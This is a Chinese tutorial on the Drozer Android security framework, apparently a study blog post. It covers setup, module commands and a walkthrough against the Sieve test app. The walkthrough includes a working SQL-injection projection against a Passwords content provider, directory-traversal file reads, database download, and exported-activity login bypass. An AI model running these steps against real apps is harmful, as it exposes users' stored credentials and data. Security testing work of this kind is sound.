## 基本介绍

Drozer是一款针对Android系统的安全测试框架，它由console和server两部分组成，其中console运行在本地计算机上，Server安装在目标Android设备上来充当一个Server，当使用console与Android设备交互时其实就是把Java代码输入到运行在实际设备上的drozer代理(agent)中
## 框架架构

Drozer的框架架构主要分为以下几个部分：
- Agent: Drozer Agent是一个运行在Android设备上的应用程序，用于与Drozer服务器进行通信。它负责管理设备上的权限和数据访问，并向Drozer服务器提供所需的信息
- Server: Drozer Server是一个运行在安全评估者的计算机上的应用程序，它充当了与Drozer Agent通信的中介。服务器负责处理从Agent发送的请求，并将结果返回给Agent
- Console: Drozer Console是安全评估者与Drozer框架交互的主要界面。通过Drozer Console，用户可以执行各种命令来检测Android应用程序中的安全漏洞
- Modules: Drozer框架包含了一系列模块，每个模块用于执行特定的任务，例如发现应用程序中的漏洞、分析应用程序的权限等，这些模块可以通过Drozer Console进行调用和使用
- Exploits: Drozer框架还提供了一些用于利用已发现漏洞的exploit模块。这些exploit模块可以帮助评估者验证漏洞的危害性，并测试应用程序的安全性
## 环境搭建
[github下载地址](https://github.com/WithSecureLabs/drozer)

![image-20250116153236773](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/image-20250116153236773.png)

安装命令：

```cmd
python -m pip install drozer-3.1.0-py3-none-any.whl
```

![image-20250116153507351](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/image-20250116153507351.png)

## 连接设备

### 使用usb连接手机和电脑

转发端口

```cmd
adb forward tcp:31415 tcp:31415
```

然后连接到 Agent：

```cmd
drozer console connect
```



### 使用网络连接

启动 Agent 并选择 "Embedded Server" 选项，然后运行：

```cmd
drozer console connect --server <phone's IP address>
```

使用 Docker 容器时：

```cmd
docker run --net host -it withsecurelabs/drozer console connect --server <phone's IP address>
```
## 使用方式

### 基础使用

#### 帮助信息

在客户端命令行中执行help命令即可查阅Drozer的可用命令信息：

```cmd
help
```

#### 命令详情

在客户端的命令行中输入help+命令的方式可以查看具体命令的使用方法，包括参数信息

```cmd
#格式说明
help 命令

#简易实例
help cd
```

#### 模块列表

在客户端的命令行中输入"list"可以纤细的列出目前可用的模块，当然也可以使用ls

```cmd
list
```

#### 模块详情

在Drozer客户端命令行中输入"help 模块名称"后即可查看模块的使用方法

```cmd
#命令格式
help 要查看的模块名称           

#简易实例
help app.activity.forintent
```

### 应用评估

在Drozer客户端命令行中输入"run 程序包名称"后即可查看程序包对应的应用详情信息：

```cmd
#列出程序包
run app.package.list

#获取已安装软件包的信息
run app.package.info

#查找可调试包
run app.package.debuggable

#查找具有共享uid的包
run app.package.shareduid

#列出使用备份API的包(在标记"允许备份"时返回true)
run app.package.backup

#获取包的启动意图
run app.package.launchintent com.android.browser

#获取包的AndroidManifest.xml
run app.package.manifest

#获取应用包的攻击面
run app.package.attacksurface package

#查找嵌入在应用程序中的本地库
run app.package.native package
```

### 组件评估

#### Activity

```cmd
#获取activity组件信息
run app.activity.info --package com.android.browser

#找到可以处理已指定的包
app.activity.forintent

# 获取可从web浏览器调用的所有可浏览的activity组件
run scanner.activity.browsable

#开启activity组件
app.activity.start
```

#### Service

```cmd
#获取service组件信息
app.service.info

#向服务组件发送消息并显示应答
run app.service.send

#开启service组件
app.service.start

#停止service组件
app.service.stop
```

#### Content Provider

```cmd
#获取Content Provider组件信息
app.provider.info

#查询Content Provider组件
app.provider.query

#在内容提供程序中列出列
app.provider.columns

#在内容提供程序中删除
app.provider.delete

#在内容提供程序中下载支持文件
app.provider.download

#在包中查找引用的内容URIS
app.provider.finduri

#插入到Content Provider组件中
app.provider.insert

#从支持文件的Content Provider读取
app.provider.read

#更新Content Provider的记录
app.provider.update

#搜索可从上下文中查询的Content Provider
scanner.provider.finduris

#测试Content Provider的注入漏洞
scanner.provider.injection

#查找可通过SQL注入漏洞访问的表
scanner.provider.sqltables

#测试Content Provider的基本目录遍历漏洞
scanner.provider.traversal
```

#### Broadcast Receivers

```cmd
#获取有关广播接收器的信息
app.broadcast.info

#带目的发送广播
app.broadcast.send

#注册一个能嗅出特定意图的广播接收器
app.broadcast.sniff
```

### 安全示例

进入设备/data/data目录寻找要测试的包名

例如：寻找到测试apk的包名，

com.withsecure.example.sieve

列出详细APP信息

```
run app.package.info -a com.withsecure.example.sieve
```

![image-20250116145651716](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/image-20250116145651716.png)

查看APP的配置信息

```
run app.package.manifest com.withsecure.example.sieve
```

![image-20250116145844337](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/image-20250116145844337.png)

应用攻击面查看

```
run app.package.attacksurface com.withsecure.example.sieve
```

![image-20250116145955664](https://cdn.jsdelivr.net/gh/halcyon098/study-img/study-images/image-20250116145955664.png)

#### Activity组件测试

 a、获取可导出的Activity组件列表

```
#命令格式
run app.activity.info -a com.xxx.xxxx

#简易示例 
run app.activity.info -a com.withsecure.example.sieve
```

b、通过调用Activity可导出的组件查看是否可以绕过部分权限校验

```
#命令格式：
run app.activity.start --component 软件包名 软件包名.对应exported的activtiy

#简易示例：
run app.activity.start --component com.withsecure.example.sieve com.withsecure.example.sieve.PWList
```

#### Service组件测试

 a、获取可以导出的Service组件信息

```
#命令格式 
run app.service.info -a com.xxx.xxxx

#简易示例 
run app.service.info -a com.mwr.example.sieve
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616111911-33941766-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111911-33941766-2b8f-1.png)

b、发送service服务

```
#命令格式：
run app.service.start --component 软件包名 软件包名.对应exported的activtiy --extra 数据

#简易示例：
run app.service.start --component com.mwr.example.sieve com.mwr.example.sieve.AuthService --extra string phone 12345678901 --extra string content Hello
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616111937-42a600f2-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111937-42a600f2-2b8f-1.png)

####  Broadcast Receivers测试

 a、获取可以导出的Broadcast信息

```
#命令格式 
run app.broadcast.info -a com.xxx.xxxx

#简易示例 
run app.broadcast.info -a com.mwr.example.sieve
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616111952-4be49a84-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616111952-4be49a84-2b8f-1.png)
 b、注册一个能嗅出特定意图的广播接收器

```
#命令格式：
run app.broadcast.sniff --action "活动"

#简易示例：
run app.broadcast.sniff --action "ddns.actiton.Token"
```

c、发送广播

```
#命令格式：
run app.broadcast.send --action 广播名 --extra string name lisi

#简易示例：
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog
```

#### 获取contentProvider信息

```
#命令格式：
run app.provider.info -a com.xxx.xxxx

#简易示例：
run app.provider.info -a com.mwr.example.sieve
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112025-5f556ada-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112025-5f556ada-2b8f-1.png)

####  获取所有可访问的Uri

```
#命令格式 
run scanner.provider.finduris -a

#简易示例 
run scanner.provider.finduris -a com.mwr.example.sieve
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112040-683bdab2-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112040-683bdab2-2b8f-1.png)

####  检测SQL注入

```
#命令格式 
run scanner.provider.injection -a com.xxx.xxxx

#简易示例 
run scanner.provider.injection -a com.mwr.example.sieve
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112053-7073f3e0-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112053-7073f3e0-2b8f-1.png)

#### 进行SQL注入

```
#命令格式
run app.provider.query [--projection] [--selection]

#简易示例 
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112108-79551e58-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112108-79551e58-2b8f-1.png)

```
#列出所有表 
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112118-7f248fc6-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112118-7f248fc6-2b8f-1.png)

####  12、检测目录遍历

```
#命令格式
run scanner.provider.traversal -a com.xxx.xxxx

#简易示例 
run scanner.provider.traversal -a com.mwr.example.sieve
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112132-87379ba4-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112132-87379ba4-2b8f-1.png)
 13、读取文件系统下的文件

```
#命令格式
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts

#简易实例
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112143-8e4b76ea-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112143-8e4b76ea-2b8f-1.png)

14、下载数据库文件到本地

```
#简易示例 
run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db d:/database.db
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20240616112158-96c215a4-2b8f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240616112158-96c215a4-2b8f-1.png)

## 文末小结

Drozer作为一款专注于Android应用安全评估的工具，其架构包括Agent、Server、Console、Modules和Exploits几个关键组件。Agent在Android设备上运行，负责与Drozer  Server通信并管理权限和数据访问；Server则在评估者的计算机上运行，处理Agent发送的请求并返回结果；Console为用户提供与Drozer框架交互的主要界面；Modules则是执行各种安全评估任务的模块集合；而Exploits则提供了用于验证漏洞危害性的工具。通过这些组件的协作Drozer为安全评估者提供了强大的能力，帮助其发现和验证Android应用程序中的安全漏洞，本篇文章主要对Drozer的框架、基础命令
 、应用评估、组件评估、安全评估进行了全方位的介绍，算是移动安全评估中Drozer极为详细的总结性文章了，希望对各位读者有帮助~
 参考文章：
 https://xz.aliyun.com/t/14846?time__1311=GqA2Y5iK0IPBqDwqeqBK0QaYlCTlLx3x#toc-5
 https://blog.csdn.net/gitblog_00493/article/details/142807778
 https://bbs.kanxue.com/thread-269196.htm#msg_header_h3_2

 